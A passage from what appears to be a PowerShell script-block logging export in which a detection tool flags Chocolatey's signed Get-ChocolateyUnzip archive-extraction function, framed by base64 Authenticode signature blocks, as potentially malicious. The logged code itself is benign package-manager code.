/k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgwmHjAcUy+iE+dyiIfi2zB5dbGJZWd7DUt/no # Ll1cr0gwDQYJKoZIhvcNAQEBBQAEggEARX58JVHLurcXQTf7fttDVIUmw5vuH+lD # raYqEYC1l92+ucU8i5J015Gv8jVcDC4gXcE4hijQ6rryX4ikBymH/qmVWLrIA4NU # a2aYYcq26oWCODgd9NOPoPvBNLg6wZNCR+BNpZ7EQ92mY4+hR6SO2lmap2D/MHCQ # FrQ6UIbfUTTHZ6KuJn8hEMizgb9w7n9uwzqh4KkA0mp/MJEIGTQIuIQTZvNs/oZQ # yTqOyO1DTHfTUs3PrvsPyTQam8k2c1z9MftLTeeAsTEScGa0/wu0HPTBdlXPVN3R # AmPtXHvT64I/IDN9FQ+NV6OdHrlOitGteeh+B6qDkoF3zr9UGzrdpaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAzWjAjBgkqhkiG9w0BCQQxFgQUReNlyfyc12kJ8VKD # f/nnmCJJFB4wDQYJKoZIhvcNAQEBBQAEggEAbahPWSbk7P/cx1sVMWPwsMH7tEIi # mCqQdlL3sr1tKO0JGxndzqRPhk3doLiL4FyKlRs6F91d9tggZgwcVsPYLSAk9/84 # wbxqv2j/KzCY6uq0uuHUsYKTuCXn2cyYqB1Iu9GCj6szi3F8KlzlNEE6EPtVYHY6 # U4pxNhGijHdAMuMtaSuK+6ZYrICOdwPTbozno88gE1GV1nPgGmVr2mxN8fwExzd8 # 7tyNCSUJg9DaM9Jw4f3zPE64PaY2V+dqZW8bHn9U0sHS8HkTEwFki4j+pg91Tdxq # A4xJiCcSSTW60n7N2tSs7VNaDxtBVK6FX48t0jMCazDRpMgfKXm7wGlvkw== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:31.725 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,58,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-ChocolateyUnzip { <# .SYNOPSIS Unzips an archive file and returns the location for further processing. .DESCRIPTION This unzips files using the 7-zip command line tool 7z.exe. Supported archive formats are listed at: https://sevenzip.osdn.jp/chm/general/formats.htm Prior to 0.9.10.1, 7za.exe was used. Supported archive formats for 7za.exe are: 7z, lzma, cab, zip, gzip, bzip2, and tar. .INPUTS None .OUTPUTS Returns the passed in $destination. .NOTES If extraction fails, an exception is thrown. If you are embedding files into a package, ensure that you have the rights to redistribute those files if you are sharing this package publicly (like on the community feed). Otherwise, please use Install-ChocolateyZipPackage to download those resources from their official distribution points. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code based on 7-zip's exit code. .PARAMETER FileFullPath This is the full path to the zip file. If embedding it in the package next to the install script, the path will be like `""$(Split-Path -Parent $MyInvocation.MyCommand.Definition)\\file.zip""` In 0.10.1+, `File` is an alias for FileFullPath. This can be a 32-bit or 64-bit file. This is mandatory in earlier versions of Chocolatey, but optional if FileFullPath64 has been provided. .PARAMETER FileFullPath64 Full file path to a 64-bit native installer to run. Available in 0.10.4+. If embedding in the package, you can get it to the path with `""$(Split-Path -parent $MyInvocation.MyCommand.Definition)\\INSTALLER_FILE""` Provide this when you want to provide both 32-bit and 64-bit installers or explicitly only a 64-bit installer (which will cause a package install failure on 32-bit systems). .PARAMETER Destination This is a directory where you would like the unzipped files to end up. If it does not exist, it will be created. .PARAMETER SpecificFolder OPTIONAL - This is a specific directory within zip file to extract. .PARAMETER PackageName OPTIONAL - This will faciliate logging unzip activity for subsequent uninstalls .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Path to the folder where the script is executing $toolsDir = (Split-Path -parent $MyInvocation.MyCommand.Definition) Get-ChocolateyUnzip -FileFullPath ""c:\someFile.zip"" -Destination $toolsDir .LINK Install-ChocolateyZipPackage #> param( [alias(""file"")][parameter(Mandatory=$false, Position=0)][string] $fileFullPath, [parameter(Mandatory=$true, Position=1)][string] $destination, [parameter(Mandatory=$false, Position=2)][string] $specificFolder, [parameter(Mandatory=$false, Position=3)][string] $packageName, [alias(""file64"")][parameter(Mandatory=$false)][string] $fileFullPath64, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bitnessMessage = '' $zipfileFullPath=$fileFullPath if ((Get-ProcessorBits 32) -or $env:ChocolateyForceX86 -eq 'true') { if (!$fileFullPath) { throw ""32-bit archive is not supported for $packageName""; } if ($fileFullPath64) { $bitnessMessage = '32-bit '; } } elseif ($fileFullPath64) { $zipfileFullPath = $fileFullPath64 $bitnessMessage = '64-bit ' } if ($zipfileFullPath -eq '' -or $zipfileFullPath -eq $null) { throw 'Package parameters incorrect, either FileFullPath or FileFullPath64 must be specified.' } if ($packageName) { $packagelibPath = $env:ChocolateyPackageFolder if (!(Test-Path -path $packagelibPath)) { New-Item $packagelibPath -type directory } $zipFilename=split-path $zipfileFullPath -Leaf $zipExtractLogFullPath= Join-Path $packagelibPath $zipFilename`.txt } if ($env:chocolateyPackageName -ne $null -and $env:chocolateyPackageName -eq $env:ChocolateyInstallDirectoryPackage) { Write-Warning ""Install Directory override not available for zip packages at this time.`n If this package also runs a native installer using Chocolatey`n functions, the directory will be honored."" } Write-Host ""Extracting $bitnessMessage$zipfileFullPath to $destination..."" if (![System.IO.Directory]::Exists($destination)) { [System.IO.Directory]::CreateDirectory($destination) | Out-Null } $7zip = Join-Path ""$helpersPath"" '..\tools\7z.exe' if (!([System.IO.File]::Exists($7zip))) { Update-SessionEnvironment $7zip = Join-Path ""$env:ChocolateyInstall"" 'tools\7z.exe' } $7zip = [System.IO.Path]::GetFullPath($7zip) Write-Debug ""7zip found at `'$7zip`'"" # 32-bit 7z would not find C:\Windows\System32\config\systemprofile\AppData\Local\Temp, # because it gets translated to C:\Windows\SysWOW64\... by the WOW redirection layer. # Replace System32 with sysnative, which does not get redirected. # 32-bit 7z is required so it can see both architectures if ([IntPtr]::Size -ne 4) { $fileFullPathNoRedirection = $zipfileFullPath -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') $destinationNoRedirection = $destination -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') } else { $fileFullPathNoRedirection = $zipfileFullPath $destinationNoRedirection = $destination } $params = ""x -aoa -bd -bb1 -o`""$destinationNoRedirection`"" -y `""$fileFullPathNoRedirection`"""" if ($specificfolder) { $params += "" `""$specificfolder`"""" } Write-Debug ""Executing command ['$7zip' $params]"" # Capture 7z's output into a StringBuilder and write it out in blocks, to improve I/O performance. $global:zipFileList = New-Object System.Text.StringBuilder $global:zipDestinationFolder = $destination # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { $line = $EventArgs.Data Write-Verbose ""$line"" if ($line.StartsWith(""- "")) { $global:zipFileList.AppendLine($global:zipDestinationFolder + ""\"" + $line.Substring(2)) } } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyZipProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyZipProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null $process.StartInfo = new-object System.Diagnostics.ProcessStartInfo($7zip, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = Get-Location $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.StartInfo.CreateNoWindow = $true $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyZipProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyZipProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for 7z.exe process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Set-PowerShellExitCode $exitCode Write-Debug ""Command ['$7zip' $params] exited with `'$exitCode`'."" if ($zipExtractLogFullPath) { Set-Content $zipExtractLogFullPath $global:zipFileList.ToString() -Encoding UTF8 -Force } Write-Debug ""7z exit code: $exitCode"" $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { throw 'Some files could not be extracted.' + $errorMessageAddendum } # this one is returned e.g. for access denied errors 2 { throw '7-Zip encountered a fatal error while extracting the files.' + $errorMessageAddendum } 7 { throw ('7-Zip command line error.' + $errorMessageAddendum) } 8 { throw '7-Zip out of memory.' + $errorMessageAddendum } 255 { throw 'Extraction cancelled by the user.' + $errorMessageAddendum } default { throw ""7-Zip signalled an unknown error (code $exitCode)"" + $errorMessageAddendum} } $env:ChocolateyPackageInstallLocation = $destination return $destination } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCDl7UF34Z4O7bJl # J2k4Fq6w3RZugnxsmdjzMLvixJbal6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # 